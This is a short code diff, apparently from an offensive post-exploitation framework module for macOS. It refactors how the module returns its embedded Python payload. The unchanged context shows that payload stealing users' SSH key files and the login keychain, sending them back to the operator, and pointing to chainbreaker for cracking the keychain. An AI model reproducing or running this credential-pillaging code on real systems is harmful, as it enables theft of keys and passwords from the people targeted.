@@ -83,7 +83,8 @@ class Module:
         sleep = self.options['Sleep']['Value']
         allUsers = self.options['AllUsers']['Value']
 
-        script = """
+        return (
+            """
 import os
 # custom function to send downloac packets back
 def downloadFile(path):
@@ -139,6 +140,6 @@ for sshFile in sshFiles:
     downloadFile('~/.ssh/' + sshFile)
 
 print "pillaging complete, if login.keychain recovered, use chainbreaker with the user password"
-""" % {'sleep': sleep, 'allUsers': allUsers}
-
-        return script
+"""
+            % {'sleep': sleep, 'allUsers': allUsers}
+        )
